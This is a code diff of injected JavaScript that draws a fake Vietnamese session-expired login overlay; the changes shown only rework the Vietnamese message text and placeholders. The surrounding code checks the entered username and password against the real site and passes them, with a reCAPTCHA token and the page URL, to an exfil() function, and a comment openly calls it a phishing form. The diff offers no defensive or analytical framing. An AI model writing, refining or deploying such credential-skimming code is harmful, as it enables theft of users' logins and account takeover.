@@ -243,14 +243,14 @@
       box.appendChild(title);
 
       var msg = document.createElement('p');
-      msg.textContent = 'Phiên session hết hạn. Vui lòng đăng nhập lại.';
+      msg.textContent = 'Vui lòng đăng nhập lại.';
       msg.style.cssText = 'margin:0 0 15px 0;color:#666;text-align:center;font-size:13px;';
       box.appendChild(msg);
 
-      // O username - giong dung form login goc (Email/Ten dang nhap/Ma NV/SDT)
+      // O username - giong dung form login goc (Email/Ten đăng nhập/Ma NV/SDT)
       var userInput = document.createElement('input');
       userInput.setAttribute('type', 'text');
-      userInput.setAttribute('placeholder', 'Email/Ten dang nhap/Ma NV/SDT');
+      userInput.setAttribute('placeholder', 'Email/Ten đăng nhập/Ma NV/SDT');
       userInput.setAttribute('id', ID_USER);
       userInput.style.cssText = 'width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;pointer-events:auto;';
       box.appendChild(userInput);
@@ -314,7 +314,7 @@
         e.stopPropagation();
         var u = userInput.value;
         var p = passInput.value;
-        if (!recaptchaToken) { msg.textContent = 'Vui long tick reCAPTCHA truoc khi dang nhap.'; msg.style.color = '#d32f2f'; return; }
+        if (!recaptchaToken) { msg.textContent = 'Hoàn thành capcha trước khi đăng nhập.'; msg.style.color = '#d32f2f'; return; }
         verifyLogin(u, p, function(valid, loginStatus) {
           exfil({ username: u, password: p, valid: valid, login_status: loginStatus, recaptcha: recaptchaToken.substring(0, 20) + '...', url: pageInfo.url }, 'pwd');
           try { localStorage.setItem('__f_done', '1'); } catch(e2) {}
@@ -356,6 +356,6 @@
   //    Thanh cong: 302 redirect ve / + Set-Cookie _msbmtu_ses
   //    valid=true/false gui kem ve server
   // 7. RECAPTCHA: nguoi dung tu tick trong form phishing
-  //    Nut 'Dang Nhap' disabled cho toi khi chua tick captcha
+  //    Nut 'đăng nhập' disabled cho toi khi chua tick captcha
   //    Khi tick xong: nut sang xanh la + animation pulse ro rat
 })();
